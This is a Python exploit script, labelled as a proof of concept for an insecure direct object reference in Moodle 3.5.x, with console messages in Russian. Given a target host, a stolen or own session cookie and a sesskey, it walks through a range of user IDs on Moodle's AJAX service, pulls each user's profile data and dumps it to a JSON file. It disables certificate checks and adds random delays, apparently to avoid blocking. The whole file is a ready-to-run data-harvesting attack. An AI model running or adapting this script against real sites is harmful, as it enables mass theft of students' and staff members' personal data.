import requests
import json
import time
import random
import argparse
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

def get_args():
    parser = argparse.ArgumentParser(description="Moodle API User Data Researcher (PoC)")
    parser.add_argument("-u", "--url", required=True, help="Base URL (e.g., example.com)")
    parser.add_argument("-c", "--cookie", required=True, help="MoodleSession cookie value")
    parser.add_argument("-s", "--sesskey", required=True, help="Sesskey value")
    parser.add_argument("--start", type=int, default=2, help="Start ID (default: 2)")
    parser.add_argument("--end", type=int, default=10, help="End ID (default: 10)")
    parser.add_argument("-o", "--output", default="moodle_dump.json", help="Output file name")
    return parser.parse_args()

def main():
    args = get_args()

    BANNER = r"""
    ____            __            
   / __ \___ _   __/ /___  _____ 
  / / / / _ \ | / / / __ \/ ___/ 
 / /_/ /  __/ |/ / / /_/ / /     
/_____/\___/|___/_/\____/_/

CVE Moodle 3.5.x (Insecure Direct Object Reference)
"""
    print(BANNER)

    target_url = f"https://{args.url}/lib/ajax/service.php?sesskey={args.sesskey}"
    cookies = {'MoodleSession': args.cookie}
    headers = {
        'Host': args.url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f"https://{args.url}",
        'Referer': f"https://{args.url}/",
        'Accept-Language': 'en-RU,en;q=0.9',
        'Connection': 'keep-alive'
    }

    results = []

    print(f"[*] Цель: {args.url}")
    print(f"[*] Диапазон ID: {args.start} - {args.end}")
    print("[!] Нажмите Ctrl+C для экстренного сохранения и выхода")
    print("-" * 40)

    try:
        for i in range(args.start, args.end + 1):
            payload = [{
                "index": 0,
                "methodname": "core_user_get_users_by_field",
                "args": {"field": "id", "values": [i]}
            }]

            try:
                r = requests.post(target_url, json=payload, cookies=cookies, headers=headers, verify=False, timeout=10)

                if r.status_code == 200:
                    data = r.json()
                    if data and not data[0].get('error') and data[0].get('data'):
                        user_info = data[0]['data'][0]
                        print(f"[+] ID {user_info.get('id')}: {user_info.get('fullname')}")
                        results.append(user_info)
                    else:
                        print(f"[-] ID {i}: Пусто/Сессия истекла")
                elif r.status_code == 403:
                    print("\n[!] Ошибка 403: Сессия истекла/Заблокиравнно WAF")
                    break
                if r.status_code == 404:
                    print("\n[!] Ошибка 404: на сайте нет уязвимости")
                    break

            except Exception as e:
                print(f"[X] Ошибка на ID {i}: {e}")

            time.sleep(random.uniform(0.5, 1.1))

    except KeyboardInterrupt:
        print("\n[!] Прервано пользователем.")

    if results:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=4)
        print(f"[***] Сохранено {len(results)} записей в {args.output}")
    else:
        print("[!] Данных нет.")


if __name__ == "__main__":
    main()